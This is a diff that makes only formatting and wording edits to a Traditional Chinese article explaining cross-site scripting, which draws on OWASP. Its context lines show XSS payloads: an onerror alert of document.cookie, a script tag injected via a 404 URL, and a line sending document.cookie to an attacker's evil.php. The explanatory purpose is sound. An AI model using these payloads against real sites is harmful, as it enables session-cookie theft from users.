@@ -8,10 +8,10 @@ tags: [security,web]
 
 跨站點腳本（XSS）攻擊發生在：
 
-數據通過不受信任的來源進入Web應用程序，最常見的是Web請求。
-數據包含在動態內容中，該動態內容在未經過惡意內容驗證的情況下發送給Web用戶。
-發送到Web瀏覽器的惡意內容通常採用JavaScript段的形式，但也可能包括HTML，Flash或瀏覽器可能執行的任何其他類型的程式碼。
-基於XSS的各種攻擊幾乎是無限的，但它們通常包括向攻擊者傳輸私有數據（如cookie或其他會話信息），將受害者重定向到攻擊者控制的Web內容，或者在用戶的計算機上執行其他惡意操作在易受攻擊的網站的幌子下。
+數據通過不受信任的來源進入Web應用程序，最常見的是Web請求。<br />
+數據包含在動態內容中，該動態內容在未經過惡意內容驗證的情況下發送給Web用戶。<br />
+發送到Web瀏覽器的惡意內容通常採用JavaScript段的形式，但也可能包括HTML，Flash或瀏覽器可能執行的任何其他類型的程式碼。<br />
+基於XSS的各種攻擊幾乎是無限的，但它們通常包括向攻擊者傳輸私有數據（如cookie或其他會話信息），將受害者重定向到攻擊者控制的Web內容，或者在用戶的計算機上執行其他惡意操作在易受攻擊的網站的幌子下。<br />
 
 
 ### 儲存型XSS攻擊
@@ -40,6 +40,8 @@ XSS在屬性中使用腳本
 ```html
 <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
 ```
+
+---
 
 ### XSS使用腳本通過編碼的URI方案
 
@@ -75,9 +77,9 @@ var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 上面的程式碼將傳遞cookie的轉義內容（根據RFC內容必須在通過HTTP協議使用GET方法發送之前將其轉義）到“cakemonster”變量中的evil.php腳本。 然後攻擊者檢查他的evil.php腳本的結果（cookie抓取器腳本通常會將cookie寫入文件）並使用它。
 
 ### 錯誤頁面示例
-假設我們有一個錯誤頁面，它處理對非現有頁面的請求，這是一個經典的404錯誤頁面。 我們可以使用下面的代碼作為示例來通知用戶缺少哪個特定頁面：
+假設我們有一個錯誤頁面，它處理對非現有頁面的請求，這是一個經典的404錯誤頁面。 我們可以使用下面的程式碼作為示例來通知用戶缺少哪個特定頁面：
 
-```html
+```php
 <html>
 <body>
 
@@ -107,7 +109,7 @@ http://testsite.test/<script>alert("TEST");</script>
 ```html
 Not found: / (but with JavaScript code <script>alert("TEST");</script>)
 ```
-我們已經成功注入了代碼，我們的XSS！ 這是什麼意思？ 例如，我們可能會利用此漏洞試圖竊取用戶的會話cookie。
+我們已經成功注入了程式碼，我們的XSS！ 這是什麼意思？ 例如，我們可能會利用此漏洞試圖竊取用戶的會話cookie。
 
 資料來源
 [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
